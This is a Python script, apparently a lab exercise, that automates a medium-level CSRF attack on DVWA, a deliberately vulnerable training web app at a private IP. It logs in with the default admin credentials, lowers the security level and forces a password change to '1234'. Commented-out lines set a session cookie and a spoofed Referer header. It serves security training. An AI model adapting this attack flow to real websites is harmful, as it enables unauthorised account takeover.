#!../venvkali/bin/python3
# !--*--coding:utf-8--*--
__author__ = 'Cazin Christophe'

''' 
Role :  CSRF medium level on DVWA
        Connect to interface 
        Setup the medium level 
        Go to CSRF menu and launch a changing of password in changing the REFERER
        Only for DVWA Version 1.10 *Development* (Release date: 2015-10-08
        else you should adapt the soup filters 
'''
import requests, sys
from termcolor import cprint
from bs4 import BeautifulSoup

# Declaration part
HOST_DVWA='172.16.13.1:81'
#HOST_DVWA='172.16.13.20/dvwa'
URI_DVWA='http://{}'.format(HOST_DVWA)
payload = {}

# Function part
print_ok = lambda x: cprint('# {} #'.format(x), 'green')
print_ko = lambda x: cprint('# {} #'.format(x), 'red' )


def main():
    if login_dvwa():
        if set_secu_medium():
            csrf_medium()



# Log in to DVWA platform
def login_dvwa():
    # We declare s ( session ) object in global to use it in other functions
    global s
    # Loading dic payload to send data on forms
    payload['password'] = 'password'
    payload['username'] = 'admin'
    payload['Login'] = 'Login'

    WELCOME_BANNER='Welcome to Damn Vulnerable Web Application!'
    url = '{}/login.php'.format(URI_DVWA)

    # Create a session to keep all parameters between several requests
    # Be careful, always work with this objects for all s.get and s.post to avoid to lost context
    s = requests.session()
    # Do a get just to take the hidden field in the log in page
    r = s.get(url)

    # Parsing into the log in page to get the hidden token
    # into r.text -° <input type=\'hidden\' name=\'user_token\' value=\'540d08899fd27226ac010b6c97fe91d8\' />
    soup = BeautifulSoup(r.text, 'html.parser')
    t = soup.find(attrs={'name': 'user_token'})
    if t:
        # Adding the token in paylod to inject in the post
        payload['user_token']=t['value']
        p = s.post(url, data=payload)
        if p.status_code == requests.codes.ok:
            # We are successfully logged
            if p.text.find(WELCOME_BANNER) != -1 :
                print_ok('Logged in to DVWA {} - status code : {}'.format(url,r.status_code))
                return True
            else:
                print_ko('Authentication error on DVWA {} - status code : {}'.format(r.url,r.status_code))
                return None

    else:
        print_ko('Error to log to DVWA urldvwalogin status code : {}'.format(r.status_code))


def set_secu_medium():
    SEC_BANNER = 'Security level set to medium'
    payload['security'] = 'medium'
    payload['seclev_submit'] = 'Submit'
    url = '{}/security.php'.format(URI_DVWA)

    r = s.post(url, data=payload)
    if r.status_code == requests.codes.ok:
        soup = BeautifulSoup(r.text, 'html.parser')
        t = soup.find(attrs={'class': 'message'})
        if t.get_text() == SEC_BANNER:
         print_ok('Security has been set to medium')
         return True

def csrf_medium():
    CSRF_BANNER='Password Changed.'
    # url = '{}/vulnerabilities/csrf/index.php'.format(URI_DVWA)
    url = '{}/vulnerabilities/csrf/'.format(URI_DVWA)
    new_password_csrf = '1234'
    # Cleanup of not necessary values in the payload dict
    list_val = ('password', 'username', 'Login', 'security', 'seclev_submit')
    for val in list_val:
        payload.pop(val)

    payload['password_new'] = new_password_csrf
    payload['password_conf'] = new_password_csrf
    payload['Change'] = 'Change'

    # headers = {
    #     'Referer' = ' '
    # }

    print('Inside csrf medium function')
    #http://172.16.13.1:81/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#
    r = s.get(url, data=payload)
    if r.status_code == requests.codes.ok:
        soup = BeautifulSoup(r.text, 'html.parser')
        print(soup.find('pre'))
        if soup.find('pre').contents[0] == CSRF_BANNER:
            print_ok('Password has been changed successfully')
            return True
        else:
            print_ko('Password has not been changed')
            return None
    # r = s.get(url)
    # print(r.text)
    # headers = {
    #     'Cookie': 'PHPSESSID=88airjn39jqo5mi25fnngko6f0; security=medium',
    #     'Referer': 'http://172.16.13.1:81/vulnerabilities/csrf/'
    # }
    # new_password = 'ac'
    # url = '%s?password_new=%s&password_conf=%s&Change=Change' % (url, new_password, new_password)
    # res = requests.get(url, headers=headers)
    # if 'Password Changed.' in res.content:
    #     print('Yes')
    # else:
    #     print('No')


if __name__ == '__main__':
    main()


